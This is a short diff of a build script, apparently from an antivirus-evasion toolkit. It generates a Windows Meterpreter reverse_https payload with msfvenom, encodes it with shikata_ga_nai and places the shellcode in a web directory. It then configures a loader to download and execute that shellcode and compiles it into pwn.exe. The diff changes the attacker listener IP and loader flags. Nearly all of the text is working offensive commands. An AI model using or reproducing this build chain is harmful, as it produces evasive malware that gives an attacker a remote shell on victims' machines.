@@ -6,9 +6,9 @@
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # create payload in /var/www/html
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -b '\x00' -i 3 -f raw -a x86 --platform Windows > /var/www/html/sc.bin
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.134 lport=443 -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > /var/www/html/sc.bin
 # config for downloading and exec shellcode
-./make_avet -d sock
+./make_avet -d sock -p
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe avet.c -lwsock32 -lWs2_32
 # cleanup
